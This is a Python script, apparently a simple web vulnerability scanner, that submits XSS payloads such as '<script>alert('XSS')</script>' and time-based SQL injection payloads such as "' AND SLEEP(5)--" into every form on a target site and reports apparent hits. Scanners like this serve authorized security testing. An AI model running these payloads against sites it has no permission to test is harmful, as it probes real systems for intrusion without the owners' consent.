# import necessary modules
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import time

# define function for scanning XSS vulnerabilities
def xss_scanner(url, payloads):
    try:
        # send GET request to target URL and parse HTML content using BeautifulSoup
        response = requests.get(url)
        soup = BeautifulSoup(response.content, "html.parser")
        
        # loop through all form elements on the page
        for form in soup.find_all("form"):
            action = form.get("action") # get form action
            method = form.get("method") # get form method
            inputs = form.find_all("input") # get all input fields in form
            
            # loop through each payload and insert it into the form data
            for payload in payloads:
                data = {}
                vulnerable = False
                for input_field in inputs:
                    input_name = input_field.get("name")
                    # skip inputs with no name or submit buttons
                    if input_name is None:
                        continue
                    if input_field.get("type") == "submit":
                        continue
                    data[input_name] = payload
                    
                # combine target URL and form action to create target URL
                target_url = urljoin(url, action)
                
                # send POST or GET request to target URL with form data
                if method.lower() == "post":
                    response = requests.post(target_url, data=data)
                else:
                    response = requests.get(target_url, params=data)
                
                # check if payload is in the response text and set vulnerability flag
                if payload in response.text:
                    vulnerable = True
                    print(f"[+] XSS vulnerability detected at {target_url}")
                    break
                
                # break out of loop if vulnerability is found
                if vulnerable:
                    break
                    
    # handle request exceptions and print error message
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
        
# define function for scanning time-based SQLi vulnerabilities
def time_based_sqli_scanner(url, payloads):
    try:
        # send GET request to target URL and parse HTML content using BeautifulSoup
        response = requests.get(url)
        soup = BeautifulSoup(response.content, "html.parser")

        for form in soup.find_all("form"):
            action = form.get("action")
            method = form.get("method")
            inputs = form.find_all("input")

            for payload in payloads:
                data = {}
                for input_field in inputs:
                    input_name = input_field.get("name")
                    if input_name is None:
                        continue
                    if input_field.get("type") == "submit":
                        continue
                    data[input_name] = payload
                    
                # combine target URL and form action to create target URL
                target_url = urljoin(url, action)
                
                # send POST or GET request to target URL with form data and measure time it takes to complete
                start_time = time.time()

                if method.lower() == "post":
                    response = requests.post(target_url, data=data)
                else:
                    response = requests.get(target_url, params=data)

                end_time = time.time()
                time_diff = end_time - start_time
                
                # check if response time is greater than 5 seconds and print vulnerability message
                if time_diff > 5:
                    print(f"[+] Time-based SQLi vulnerability detected at {target_url}")
                    break
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    url = "http://example.com"  # Replace with the target domain
    xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
    sqli_payloads = ["' AND SLEEP(5)--", "' OR SLEEP(5)#"]

    print("[*] Scanning for XSS vulnerabilities")
    xss_scanner(url, xss_payloads)

    print("[*] Scanning for time-based SQLi vulnerabilities")
    time_based_sqli_scanner(url, sqli_payloads)
